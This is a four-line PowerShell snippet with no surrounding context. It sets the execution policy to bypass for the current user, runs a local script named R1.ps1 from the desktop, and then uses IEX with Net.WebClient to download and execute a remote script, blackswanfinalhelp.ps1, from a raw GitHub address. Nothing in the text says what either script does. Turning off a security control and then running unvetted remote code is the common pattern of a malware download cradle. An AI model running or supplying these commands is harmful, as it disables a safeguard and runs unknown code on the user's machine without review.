set-executionpolicy -executionpolicy bypass -scope currentuser -force
cd $env:userprofile\desktop
.\R1.ps1
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/blackswanfinalhelp.ps1')
